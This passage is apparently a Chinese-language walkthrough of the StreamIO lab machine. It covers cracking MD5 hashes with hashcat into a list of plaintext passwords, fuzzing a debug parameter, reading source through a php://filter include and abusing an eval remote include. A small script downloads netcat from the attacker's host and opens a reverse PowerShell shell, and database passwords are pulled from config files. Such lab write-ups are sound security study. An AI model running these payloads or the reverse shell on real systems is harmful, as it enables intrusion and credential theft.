* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
Approaching final keyspace - workload adjusted.           

f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hash
Time.Started.....: Thu Dec 19 02:23:45 2024 (11 secs)
Time.Estimated...: Thu Dec 19 02:23:56 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1355.5 kH/s (0.25ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 14/31 (45.16%) Digests (total), 14/31 (45.16%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[212173657879616e67656c2121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 50%

Started: Thu Dec 19 02:23:27 2024
Stopped: Thu Dec 19 02:23:57 2024

~~~

得到凭据

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ hashcat hash --wordlist /usr/share/wordlists/rockyou.txt -m 0  --user --show
Hashfile 'hash' on line 3 (Alexen...c2b3d8270321140e5153f6637d3ee53 ): Token length exception

* Token length exception: 1/32 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)

d41d8cd98f00b204e9800998ecf8427e:
admin :665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry :54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara :ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Juliette :6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren :08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord :ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
lizi :e10adc3949ba59abbe56e057f20f883e:123456
Michelle :b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane :3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria :b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide :b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..

~~~

![](Pasted%20image%2020241219152743.png)

构造两个字典

![](Pasted%20image%2020241219153007.png)

利用bp进行登录
最后通过yoshihide:66boysandgirls..成功登录但是没有交互的面板
发现之前的admin目录可以访问

![](Pasted%20image%2020241219155026.png)

对admin目录进行第二次扫描，发现了之前漏扫的master.php

![](Pasted%20image%2020241219155449.png)

访问发现该文件只允许被包含

![](Pasted%20image%2020241219155550.png)


url看起来似乎可以传参，对参数名进行fuzz，发现了一个感兴趣的debug
~~~
┌──(kali㉿kali)-[~/StreamIO]

└─$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://streamio.htb/admin/?FUZZ=lizi --hh 1678 -H "Cookie: PHPSESSID=t4tvninhisdj22sid4frqcbeib"

********************************************************

* Wfuzz 3.1.0 - The Web Fuzzer *

********************************************************

Target: https://streamio.htb/admin/?FUZZ=lizi

Total requests: 207643

=====================================================================

ID Response Lines Word Chars Payload

=====================================================================

000000125: 200 122 L 295 W 3928 Ch "user"

000000242: 200 398 L 916 W 12484 Ch "staff"

000001013: 200 10790 25878 W 320235 Ch "movie"

L

000005329: 200 49 L 137 W 1712 Ch "debug"
~~~

对debug传参master.php试试，结果在没有管理员权限的情况下包含了master.php

![](Pasted%20image%2020241219161153.png)

试一下包含其他文件https://streamio.htb/admin/?debug=c:\windows\win.ini
失败
![](Pasted%20image%2020241219161444.png)

尝试用php伪协议读取一下master.php的源码
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php

成功读取

![](Pasted%20image%2020241219162255.png)

解密一下master.php的源码

~~~
┌──(kali㉿kali)-[~/StreamIO]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
└─$ base64 -d master.php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
<h1>Movie managment</h1>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
if(!defined('included'))                                                                                                                                      
        die("Only accessable through includes");                                                                                                              
if(isset($_POST['movie_id']))                                                                                                                                 
{                                                                                                                                                             
$query = "delete from movies where id = ".$_POST['movie_id'];                                                                                                 
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));                                                                               
}                                                                                                                                                             
$query = "select * from movies order by movie";                                                                                                               
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));                                                                               
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))                                                                                                    
{                                                                                                                                                             
?>                                                                                                                                                            

<div>                                                                                                                                                         
        <div class="form-control" style="height: 3rem;">                                                                                                      
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>                                                                                     
                <div style="float:right;padding-right: 25px;">                                                                                                
                        <form method="POST" action="?movie=">                                                                                                 
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">                                                       
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">                                                           
                        </form>                                                                                                                               
                </div>                                                                                                                                        
        </div>                                                                                                                                                
</div>                                                                                                                                                        
<?php                                                                                                                                                         
} # while end                                                                                                                                                 
?>                                                                                                                                                            
<br><hr><br>                                                                                                                                                  
<h1>Staff managment</h1>                                                                                                                                      
<?php                                                                                                                                                         
if(!defined('included'))                                                                                                                                      
        die("Only accessable through includes");                                                                                                              
$query = "select * from users where is_staff = 1 ";                                                                                                           
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));                                                                               
if(isset($_POST['staff_id']))                                                                                                                                 
{                                                                                                                                                             
?>                                                                                                                                                            
<div class="alert alert-success"> Message sent to administrator</div>                                                                                         
<?php                                                                                                                                                         
}                                                                                                                                                             
$query = "select * from users where is_staff = 1";                                                                                                            
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));                                                                               
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))                                                                                                    
{                                                                                                                                                             
?>                                                                                                                                                            

<div>                                                                                                                                                         
        <div class="form-control" style="height: 3rem;">                                                                                                      
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>                                                                                  
                <div style="float:right;padding-right: 25px;">                                                                                                
                        <form method="POST">                                                                                                                  
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">                                                       
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">                                                           
                        </form>                                                                                                                               
                </div>                                                                                                                                        
        </div>                                                                                                                                                
</div>                                                                                                                                                        
<?php                                                                                                                                                         
} # while end                                                                                                                                                 
?>                                                                                                                                                            
<br><hr><br>                                                                                                                                                  
<h1>User managment</h1>                                                                                                                                       
<?php                                                                                                                                                         
if(!defined('included'))                                                                                                                                      
        die("Only accessable through includes");                                                                                                              
if(isset($_POST['user_id']))                                                                                                                                  
{                                                                                                                                                             
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];                                                                                  
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));                                                                               
}                                                                                                                                                             
$query = "select * from users where is_staff = 0";                                                                                                            
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));                                                                               
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))                                                                                                    
{                                                                                                                                                             
?>                                                                                                                                                            

<div>                                                                                                                                                         
        <div class="form-control" style="height: 3rem;">                                                                                                      
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>                                                                                  
                <div style="float:right;padding-right: 25px;">                                                                                                
                        <form method="POST">                                                                                                                  
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">                                                        
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">                                                           
                        </form>                                                                                                                               
                </div>                                                                                                                                        
        </div>                                                                                                                                                
</div>                                                                                                                                                        
<?php                                                                                                                                                         
} # while end                                                                                                                                                 
?>                                                                                                                                                            
<br><hr><br>                                                                                                                                                  
<form method="POST">                                                                                                                                          
<input name="include" hidden>                                                                                                                                 
</form>                                                                                                                                                       
<?php                                                                                                                                                         
if(isset($_POST['include']))                                                                                                                                  
{                                                                                                                                                             
if($_POST['include'] !== "index.php" )                                                                                                                        
eval(file_get_contents($_POST['include']));                                                                                                                   
else                                                                                                                                                          
echo(" ---- ERROR ---- ");                                                                                                                                    
}                                                                                                                                                             
?>                 
~~~

简单的代码审计发现问题，会执行被包含的文件中的命令

~~~
<input name="include" hidden>                                                                                                                                 
</form>                                                                                                                                                       
<?php                                                                                                                                                         
if(isset($_POST['include']))                                                                                                                                  
{                                                                                                                                                             
if($_POST['include'] !== "index.php" )                                                                                                                        
eval(file_get_contents($_POST['include']));                                                                                                                   
else                                                                                                                                                          
echo(" ---- ERROR ---- ");                                                                                                                                    
}    
~~~

试一下有没有远程包含

在本体开启web服务，并准备一个nc64.exe

![](Pasted%20image%2020241219163459.png)

准备一个恶意脚本

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ cat eval.php 
system("powershell.exe -c wget http://10.10.16.14/nc64.exe -outfile c:\\programdata\\nc64.exe")
system("c:\\programdata\\nc64.exe 10.10.16.14 443 -e powershell.exe")
~~~

建立监听

![](Pasted%20image%2020241219164622.png)

用curl执行成功拿到初步shell

![](Pasted%20image%2020241219170527.png)

接下来要尝试横向移动

查找一下数据库登陆凭据
![](Pasted%20image%2020241219171043.png)

在login.php中找到db_user凭据

~~~
$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');                                                        
~~~

在regester.php中找到admin.php的凭据

~~~
    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');                                                                                                                
~~~